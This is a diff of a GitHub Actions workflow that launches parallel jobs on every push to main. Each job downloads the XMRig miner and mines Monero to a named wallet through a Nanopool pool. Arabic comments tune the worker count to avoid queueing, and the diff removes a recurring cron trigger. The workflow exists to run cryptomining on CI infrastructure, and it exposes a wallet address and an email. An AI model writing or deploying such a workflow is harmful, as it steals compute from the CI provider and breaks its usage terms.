@@ -1,19 +1,17 @@
-name: Whale 10 Workers Fast
+name: Whale Instant Start
 on:
   push:
     branches: [ main ]
-  schedule:
-    - cron: "0 */6 * * *"
 
 jobs:
   mining:
-    name: Mining Worker
-    # تغيير النسخة لتجنب الزحمة في ubuntu-latest
+    name: Quick Worker
     runs-on: ubuntu-20.04
     strategy:
       fail-fast: false
       matrix:
-        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        # 5 عمال فقط لضمان عدم الانتظار في الطابور
+        worker_id: [1, 2, 3, 4, 5]
 
     steps:
       - name: Checkout Code
@@ -21,7 +19,6 @@ jobs:
 
       - name: Preparation
         run: |
-          # تحميل النسخة المستقرة
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
           tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
           cp xmrig-6.21.0/xmrig .
@@ -29,7 +26,6 @@ jobs:
 
       - name: Run Mining
         run: |
-          # تشغيل مع تحديد الخوارزمية والإيميل (Password)
           ./xmrig -o xmr-eu1.nanopool.org:14444 \
           -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.worker${{ matrix.worker_id }}/nfdr065@gmail.com \
           --algo rx/0 \
